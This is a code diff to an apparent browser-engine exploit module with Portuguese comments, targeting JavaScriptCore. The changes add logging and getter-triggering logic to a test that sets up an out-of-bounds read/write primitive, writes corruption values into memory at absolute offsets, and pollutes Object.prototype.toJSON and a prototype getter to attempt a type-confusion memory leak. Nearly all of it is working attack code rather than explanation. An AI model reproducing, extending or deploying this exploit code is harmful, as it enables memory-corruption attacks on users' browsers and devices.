@@ -4,7 +4,7 @@ import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_array_buffer_real,
-    oob_dataview_real, // <--- ADICIONADO AQUI
+    oob_dataview_real,
     oob_write_absolute,
     oob_read_absolute,
     clearOOBEnvironment
@@ -15,7 +15,6 @@ const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
 let retype_getter_called_flag = false;
 let retype_leak_attempt_results = {};
 
-// Endereço baixo e inválido para o teste de crash controlado.
 const ENDERECO_INVALIDO_PARA_LEITURA_TESTE = new AdvancedInt64(0x1, 0x0);
 
 
@@ -23,22 +22,42 @@ class CheckpointObjectForRetype {
     constructor(id) {
         this.id = `RetypeCheckpoint-${id}`;
         this.marker = 0xD0D0D0D0;
+        // Para garantir que a propriedade exista no objeto para o loop 'for...in'
+        // e para o acesso direto. O getter será definido no protótipo.
+        this[GETTER_CHECKPOINT_PROPERTY_NAME] = "initial_value";
     }
 }
 
 export function toJSON_TriggerRetypeCheckpointGetter() {
     const FNAME_toJSON = "toJSON_TriggerRetypeCheckpointGetter";
     let returned_payload = { _variant_: FNAME_toJSON, _id_at_entry_: String(this?.id || "N/A") };
-    try {
-        for (const prop in this) {
-            if (prop === GETTER_CHECKPOINT_PROPERTY_NAME) {
-                 logS3(`Propriedade getter "${prop}" encontrada durante 'for...in' em toJSON.`, "info", FNAME_toJSON);
-                 const _ = this[prop]; // Aciona o getter
-            }
+
+    // Log detalhado sobre 'this'
+    logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' é: ${Object.prototype.toString.call(this)}, id: ${this?.id}, é CheckpointObject?: ${this instanceof CheckpointObjectForRetype}`, "info", FNAME_toJSON);
+    if (this instanceof CheckpointObjectForRetype) {
+        logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' É uma instância de CheckpointObjectForRetype. Tentando acessar getter '${GETTER_CHECKPOINT_PROPERTY_NAME}' diretamente.`, "info", FNAME_toJSON);
+        try {
+            // Tenta acionar o getter diretamente
+            // eslint-disable-next-line no-unused-vars
+            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME];
+            logS3(`toJSON_TriggerRetypeCheckpointGetter: Acesso direto a this['${GETTER_CHECKPOINT_PROPERTY_NAME}'] completado. Se o getter foi chamado, um log dele deve aparecer.`, "info", FNAME_toJSON);
+        } catch (e) {
+            logS3(`toJSON_TriggerRetypeCheckpointGetter: Erro ao acessar diretamente this['${GETTER_CHECKPOINT_PROPERTY_NAME}']: ${e.message}`, "error", FNAME_toJSON);
         }
-    } catch (e) {
-        logS3(`Erro dentro do toJSON_TriggerRetypeCheckpointGetter durante o loop de propriedades: ${e.message}`, "error", FNAME_toJSON);
-        returned_payload.error_in_loop = e.message;
+    } else {
+        logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' NÃO é uma instância de CheckpointObjectForRetype. Tentando loop 'for...in' como fallback.`, "warn", FNAME_toJSON);
+        try {
+            for (const prop in this) {
+                if (prop === GETTER_CHECKPOINT_PROPERTY_NAME) {
+                     logS3(`Propriedade getter "${prop}" encontrada durante 'for...in' em toJSON. Acessando...`, "info", FNAME_toJSON);
+                     // eslint-disable-next-line no-unused-vars
+                     const _ = this[prop]; // Aciona o getter
+                }
+            }
+        } catch (e) {
+            logS3(`Erro dentro do toJSON_TriggerRetypeCheckpointGetter durante o loop de propriedades: ${e.message}`, "error", FNAME_toJSON);
+            returned_payload.error_in_loop = e.message;
+        }
     }
     return returned_payload;
 }
@@ -51,7 +70,6 @@ export async function executeRetypeOOB_AB_Test() {
     retype_getter_called_flag = false;
     retype_leak_attempt_results = { success: false, message: "Não inicializado", error: null };
 
-    // Validações de configuração (essenciais)
     if (!JSC_OFFSETS.ArrayBufferContents ||
         JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START === undefined ||
         JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START === undefined ||
@@ -78,7 +96,6 @@ export async function executeRetypeOOB_AB_Test() {
          logS3(`AVISO: ArrayBuffer_STRUCTURE_ID (${arrayBufferStructureID}) não é o valor comum (2) ou o valor validado. Verifique config.mjs.`, "warn", FNAME_TEST);
     }
 
-
     let toJSONPollutionApplied = false;
     let getterPollutionApplied = false;
     let originalToJSONProtoDesc = null;
@@ -86,8 +103,8 @@ export async function executeRetypeOOB_AB_Test() {
     const ppKey_val = 'toJSON';
 
     try {
-        await triggerOOB_primitive(); // Configura oob_array_buffer_real e oob_dataview_real
-        if (!oob_array_buffer_real || !oob_dataview_real) { // Verificação para garantir que ambos foram definidos
+        await triggerOOB_primitive();
+        if (!oob_array_buffer_real || !oob_dataview_real) {
             logS3("Falha ao inicializar o ambiente OOB. oob_array_buffer_real ou oob_dataview_real não definidos. Abortando.", "critical", FNAME_TEST);
             return;
         }
@@ -117,6 +134,7 @@ export async function executeRetypeOOB_AB_Test() {
         oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
 
         const checkpoint_obj = new CheckpointObjectForRetype(1);
+        // Salva o descritor original da propriedade no protótipo, se existir
         originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
 
         Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
@@ -172,14 +190,18 @@ export async function executeRetypeOOB_AB_Test() {
 
     } catch (mainError) {
         logS3(`Erro principal no teste executeRetypeOOB_AB_Test: ${mainError.message}`, "critical", FNAME_TEST);
-        console.error(mainError); // Adicionado para ver o stack trace no console do navegador
+        console.error(mainError);
         retype_leak_attempt_results.success = false;
         retype_leak_attempt_results.message = "Erro crítico no fluxo principal do teste.";
         retype_leak_attempt_results.error = String(mainError);
     } finally {
-        if (toJSONPollutionApplied) {
-            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
-            else delete Object.prototype[ppKey_val];
+        // Restauração da poluição
+        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { // Verifica se a propriedade ainda existe
+            if (originalToJSONProtoDesc) {
+                 Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
+            } else {
+                delete Object.prototype[ppKey_val];
+            }
         }
         if (getterPollutionApplied && CheckpointObjectForRetype.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) {
             if (originalGetterDesc) {
